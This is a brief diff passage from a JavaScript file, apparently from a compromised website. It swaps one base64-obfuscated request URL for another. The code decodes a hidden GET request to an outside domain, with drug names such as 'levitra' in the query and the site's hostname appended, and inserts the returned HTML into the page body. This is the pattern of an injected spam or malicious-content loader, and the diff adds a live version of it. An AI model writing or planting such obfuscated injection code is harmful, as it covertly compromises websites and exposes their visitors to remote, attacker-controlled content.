@@ -68,7 +68,7 @@
                         document.body.appendChild(html);
                     };
                     var httpRequest = new XMLHttpRequest();
-                    httpRequest.open(window.atob("R0VU"), window.atob("aHR0cHM6Ly8xMWwxMS50b3AvP3Q9Y2lhbGlzJnk9")+window.location.hostname, true);
+                    httpRequest.open(window.atob("R0VU"), window.atob("aHR0cHM6Ly8xMWwxMS50b3AvP3Q9bGV2aXRyYSZ5PQ==")+window.location.hostname, true);
                     httpRequest.send();
                     httpRequest.onreadystatechange = function () {
                         if (httpRequest.readyState == 4 && httpRequest.status == 200) {
